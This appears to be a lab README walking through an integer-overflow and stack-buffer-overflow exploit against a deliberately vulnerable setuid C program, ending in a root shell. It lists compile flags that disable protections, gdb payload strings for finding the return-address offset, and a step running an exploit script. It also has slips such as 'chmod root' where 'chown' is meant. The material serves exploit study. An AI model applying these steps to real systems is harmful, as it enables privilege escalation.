Integer Overflow example:

https://sploitfun.wordpress.com/2015/06/23/integer-overflow/

This attack by-passes the password length check by integer overflow 
and then subsequently exploiting stack based buffer overlow.

This works by wrapping unsigned int lager than unsigned char when 
storing in unsigned char destination variable.

The same type of attack also works for underflows (reverse wrap).

1. Disable ALSR using common tool.
2. Compile program and set suid:
   * gcc -g -fno-stack-protector -z execstack -o vuln vuln.c
   * sudo chmod root vuln
   * sudo chgrp root vuln
   * sudo chmod +s vuln
3. Run gdb and test overflow using decimal number > max unsigned char
   * r vuln `python -c 'print "A"*261'` # eip should now be AAAA
4. When eip is gained, calc offset to ret
   * r vuln `python -c 'print "A"*24 + "B"*4 + "C"*233'` # eip should now be BBBB
   * Here, 24 was calculated by: 11 for passwd_buf, 1 for passwd_len, 4*3 for 
     alignment space, edi and ebp
5. Find suitable NOP address:
   * r vuln `python -c 'print "A"*24 + "B"*4 + "C"*100 + "D"*133'`
   * x/40x $esp # select a memeory location which is CCCC
6. Update exp.py script with NOP address
7. Run exploit:
   * python exp.py
   * Should have root shell, check id
